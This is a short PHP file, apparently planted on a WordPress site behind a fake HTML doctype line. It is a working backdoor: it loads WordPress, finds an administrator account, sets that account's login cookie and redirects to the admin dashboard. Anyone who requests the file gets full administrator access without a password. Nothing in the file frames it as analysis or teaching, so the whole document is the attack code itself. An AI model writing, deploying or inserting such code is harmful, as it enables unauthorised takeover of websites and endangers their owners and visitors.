<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<?php 
    $mr = $_SERVER["DOCUMENT_ROOT"];
    @chdir($mr);
    if (file_exists("wp-load.php")) {
        include "wp-load.php";
        $wp_user_query = new WP_User_Query([
            "role" => "Administrator",
            "number" => 1,
            "fields" => "ID",
        ]);
        $results = $wp_user_query->get_results();
        if (isset($results[0])) {
            wp_set_auth_cookie($results[0]);
            wp_redirect(admin_url());
            die();
        }
        die("NO ADMIN");
    } else {
        die("Failed to load");
    }
?>
